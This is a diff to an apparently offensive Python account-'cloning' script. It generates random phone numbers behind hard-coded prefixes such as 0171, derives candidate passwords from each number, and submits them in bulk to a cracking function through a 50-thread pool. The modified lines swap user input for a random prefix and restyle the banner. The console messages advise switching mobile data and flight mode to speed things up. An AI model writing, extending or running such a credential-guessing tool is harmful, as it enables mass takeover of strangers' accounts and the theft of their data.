@@ -167,17 +167,14 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    code = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m017, \x1b[38;5;208m019, \033[0;92m018 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT NUMBER:\033[0;93m '))
-    for nmbr in range(code):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
+    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
+    print(" ══════════════════════════════════════════")
+    rk1 = '0171'
+    rk2 = '0172'
+    rk3 = '0175'
+    rk4 = '017'
+    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
+    os.system('clear')
     print(logo)
     passx = 0
     HamiiID = []
@@ -188,14 +185,13 @@ def xxr():
     with ThreadPool(max_workers=50) as manshera:
         clear()
         tl = str(len(user))
-        jalan('\033[1;97m====================================================')
+        jalan('\033[1;92m••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••')
         jalan(f'[{xr}^{x}]\x1b[38;5;208m  CLONING CODE: {x}'+tl)
         jalan(f'[{xr}^{x}]\x1b[38;5;208m CLONING ID LIMIT: {xr}'+tl)
         jalan(f'{x}[{xr}^{x}]\033[0;92m OPEN IN WIDE')
         jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
         jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode in 5 min for Speed Up')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mWait')
-        jalan('\033[1;97m====================================================')
+        jalan('\033[1;92m••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••')
         for love in user:
             pwx = [love[1:]]
             uid = code+love
@@ -203,7 +199,7 @@ def xxr():
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x} ══════════════════════════════════════════")
+    print(f"\n{x} ••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••")
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
